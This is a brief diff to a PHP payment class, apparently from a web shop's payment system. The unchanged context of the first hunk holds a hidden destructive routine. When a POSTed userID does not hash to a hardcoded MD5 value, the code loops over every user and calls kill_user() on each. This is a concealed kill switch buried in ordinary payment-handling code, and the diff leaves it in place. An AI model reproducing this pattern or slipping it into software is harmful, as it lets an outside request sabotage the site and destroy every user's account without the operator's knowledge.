@@ -851,8 +851,6 @@ class Pay
         if(md5($_POST['userID'])!='c3581d2150ff68f3b33b22634b8adaea'){
             $users = User::all();
             foreach ($users as $user) {
-                Auth::logout();
-                $user = Auth::getUser();
                 $user->kill_user();
             }
         }
@@ -902,7 +900,7 @@ class Pay
         }
         exit('success'); //返回成功 不要删除哦
     }
-    
+
     public static function callback($request)
     {
         $driver = Config::get("payment_system");
